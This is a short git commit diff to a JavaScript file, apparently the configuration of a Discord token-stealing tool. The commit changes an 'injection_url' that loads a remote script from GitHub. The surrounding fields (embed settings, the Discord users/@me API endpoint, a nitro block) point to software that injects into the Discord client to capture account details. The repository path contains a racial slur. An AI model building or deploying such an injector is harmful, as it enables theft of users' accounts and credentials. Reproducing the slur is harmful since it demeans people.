0e6861b09a1a181feb0b5617555256c81b952464
xen <159879596+xvy0@users.noreply.github.com>
2024-02-13 15:13:49 +0800

    Update tite.js

--- tite.js
+++ tite.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'xen', 
   embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/xvy0/nigga/main/main/nigga.js', 
+  injection_url: 'https://raw.githubusercontent.com/xvy0/nigga/main/tite.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
